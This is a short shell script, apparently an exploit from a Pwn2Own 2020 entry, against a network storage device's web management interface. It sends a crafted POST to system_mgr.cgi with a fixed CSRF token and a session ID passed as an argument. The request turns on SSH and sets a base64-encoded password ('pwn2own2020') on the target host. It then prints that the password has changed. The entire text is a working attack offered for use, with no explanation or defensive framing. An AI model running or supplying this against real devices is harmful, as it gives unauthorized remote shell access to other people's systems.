curl -i -s -k -X $'POST' \
    -H $'Host: \$1' -H $'User-Agent: Mozilla/5.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-CSRF-Token: fixed' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 39' -H $'Origin: http://\$1' -H $'Connection: close' -H $'Referer: http://\$1/' -H $'Cookie: local_login=1; fw_version=2.40.155; PHPSESSID=\$2; WD-CSRF-TOKEN=fixed' \
    -b $'local_login=1; fw_version=2.40.155; PHPSESSID=\$2; WD-CSRF-TOKEN=fixed' \
    --data-binary $'cmd=cgi_ssh&ssh=1&pw=cHduMm93bjIwMjA=' \
    $'http://\$1/cgi-bin/system_mgr.cgi'

echo "password is now pwn2own2020"